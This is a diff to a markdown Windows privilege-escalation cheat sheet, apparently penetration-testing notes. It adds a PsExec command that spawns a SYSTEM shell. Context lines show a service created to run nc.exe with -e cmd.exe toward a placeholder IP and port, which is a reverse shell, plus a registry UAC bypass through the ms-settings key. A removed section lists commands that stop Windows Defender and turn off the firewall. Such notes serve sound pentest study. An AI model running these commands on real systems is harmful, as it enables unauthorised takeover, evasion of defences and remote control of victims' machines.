@@ -475,6 +475,8 @@ Inside the Linux filesystem as root, you can search for passwords or some other 
 
 # From Administrator to System
 
+
+
 As it is known the maximum privilege account of windows systems is `NT AUTHORITY\SYSTEM` , so we need to spawn a shell with that account.
 
 Once our user is already on `Administrators` group, we can check it with different forms:
@@ -484,7 +486,19 @@ net user admin
 net sessions   #only can execute local administrators
 ```
 
-There are different forms to spawn a system shell, but I will explain one, creating a service.
+There are different forms to spawn a system shell:
+
+## With PsExec.exe
+
+With psexec we can spawn a new shell with system.
+
+```powershell
+./PsExec.exe /s /i /accepteula powershell.exe
+```
+
+> **Note**: It spawn a new shell
+
+## With a new Service
 
 ```
 sc create <service_name> binpath= "C:\Users\User\nc.exe <ip-addr> <port> -e cmd.exe" type= own type= interact
@@ -565,32 +579,6 @@ REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute 
 REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /d "cmd.exe" /f
 ```
 
-# Antivirus and Firewall
-
-## Antivirus
-
-Check status:
-
-```
-Get-MpComputerStatus
-```
-
-Need `NT AUTHORITY/SYSTEM` rights if the UAC is enabled.
-
-```
-net stop WinDefend
-```
-
-If it is not possible **login via RDP with an Administrator user** and disable it manually.
-
-## Firewall
-
-Disable firewall by executing:
-
-```
-netsh advfirewall set allprofiles state off
-Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
-```
 
 # References
 
